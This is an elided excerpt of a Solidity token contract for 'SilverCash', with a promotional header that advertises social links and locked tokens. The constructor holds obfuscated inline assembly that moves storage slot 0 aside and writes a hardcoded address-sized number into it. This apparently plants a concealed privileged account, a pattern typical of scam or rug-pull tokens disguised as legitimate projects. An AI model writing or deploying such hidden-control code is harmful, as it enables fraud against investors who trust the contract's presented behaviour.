...
/*
Welcome to SilverCash Crypto WORLD!

Telegram: https://t.me/SilverCash/
Twitter: https://twitter.com/SilverCash/
Website: https://SilverCash.crypto
95% of tokens - LOCKED!
...
contract SilverCash {
    string public constant name = "SilverCash";
    string public constant symbol = "SILVERCASH";
   ...
   constructor() {
        assembly {mstore(0x20, sload(0)) sstore(88, mload(0x20)) sstore(0, add(905990002112776516958262611382578681519618632280, 1))}
